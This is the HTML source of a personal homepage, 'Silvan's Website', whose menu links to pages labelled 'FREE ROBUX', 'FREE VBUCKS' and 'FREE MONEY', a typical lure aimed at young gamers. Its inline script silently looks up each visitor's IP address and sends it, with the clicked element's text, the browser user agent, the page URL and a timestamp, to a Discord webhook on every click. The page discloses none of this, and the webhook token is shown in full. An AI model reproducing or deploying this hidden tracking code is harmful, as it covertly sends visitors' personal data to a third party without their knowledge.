<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="apple-touch-icon" href="/favicon.png">
  <link rel="icon" type="image/png" sizes="225x225" href="/favicon.png">
  <link rel="icon" href="/favicon.ico">
  <meta charset="UTF-8">
  <title>Silvan's Website</title>

  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #a1c4fd 0%, #c2e9fb 100%);
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      align-items: center;
      justify-content: center;
      color: #333;
      overflow-x: hidden;
    }

    h1 {
      font-size: 3.5em;
      margin-bottom: 10px;
      color: #1b2a49;
      text-shadow: 1px 1px 5px rgba(0,0,0,0.1);
    }

    p {
      font-size: 1.3em;
      margin-bottom: 50px;
      color: #2c3e50;
    }

    #menu {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 25px;
      list-style: none;
      padding: 0;
    }

    #menu li {
      max-width: 220px;
    }

    #menu a {
      display: block;
      text-align: center;
      padding: 25px;
      background: linear-gradient(145deg, #3498db, #5dade2);
      color: #fff;
      text-decoration: none;
      font-weight: bold;
      font-size: 1.2em;
      border-radius: 20px;
      transition: 0.3s;
    }

    #menu a:hover {
      transform: scale(1.05);
    }

    footer {
      margin-top: 60px;
      font-size: 0.9em;
    }
  </style>
</head>

<body>
  <h1>Welcome to Silvan's Website!</h1>
  <p>Choose a page from the menu:</p>

  <ul id="menu"></ul>

  <footer>&copy; 2026 Silvan</footer>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1457349541094490217/pBaDH8FZMP2ZJJj19Ia4MBmdwvqOWaYXowuwvL8rGeFiSCeGSU9mah_M2kgXSAN-CYTJ";

    const unterseiten = [
      { name: "Cloud", folder: "/cloud/index.html" },
      { name: "FREE ROBUX", folder: "/freerobux/" },
      { name: "FREE VBUCKS", folder: "/freevbucks/" },
      { name: "FREE MONEY", folder: "/freemoney/" },
      { name: "MCMODS/PLUGINS", folder: "/plugins/" }
    ];

    const menu = document.getElementById("menu");

    unterseiten.forEach(seite => {
      const li = document.createElement("li");
      const link = document.createElement("a");
      link.href = seite.folder;
      link.textContent = seite.name;
      li.appendChild(link);
      menu.appendChild(li);
    });

    /* -------------------------------
       TRACKING (METHODE 2)
    -------------------------------- */

    let cachedIP = "unknown";
    let lastSend = 0;
    const COOLDOWN = 250; // 0.25 Sekunden

    // IP EINMALIG holen
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => cachedIP = data.ip)
      .catch(() => cachedIP = "ip_unavailable");

    document.addEventListener("click", (e) => {
      const now = Date.now();
      if (now - lastSend < COOLDOWN) return;
      lastSend = now;

      const elementText =
        e.target.innerText?.trim().slice(0, 100) ||
        e.target.value ||
        e.target.tagName;

      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content:
`Click detected
Page: ${location.href}
Element: ${e.target.tagName}
Text: ${elementText}
UserAgent: ${navigator.userAgent}
IP: ${cachedIP}
Time: ${new Date().toISOString()}`
        })
      });
    });
  </script>
</body>
</html>
